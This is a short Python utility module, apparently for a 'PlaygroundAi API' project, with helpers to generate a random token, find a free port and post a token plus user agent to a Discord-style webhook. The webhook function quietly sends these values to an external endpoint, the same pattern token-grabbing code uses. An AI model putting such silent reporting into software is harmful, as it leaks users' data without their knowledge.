import secrets
import socket
import requests
import json
from config import WEBHOOK_URL

def generate_token():
    return ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10))

def find_free_port(start_port, max_attempts=10):
    for port in range(start_port, start_port + max_attempts):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('', port))
            sock.close()
            return port
        except OSError:
            continue
    return None

def send_to_webhook(token, user_agent):
    try:
        data = {
            "embeds": [{
                "title": "PlaygroundAi API",
                "fields": [
                    {"name": "Token", "value": token if token else "0", "inline": False},
                    {"name": "User Agent", "value": user_agent if user_agent else "0", "inline": False},
                ]
            }]
        }
        requests.post(
            WEBHOOK_URL,
            data=json.dumps(data),
            headers={"Content-Type": "application/json"},
            timeout=2
        )
    except Exception as e:
        print(f"Webhook error (non-critical): {str(e)}")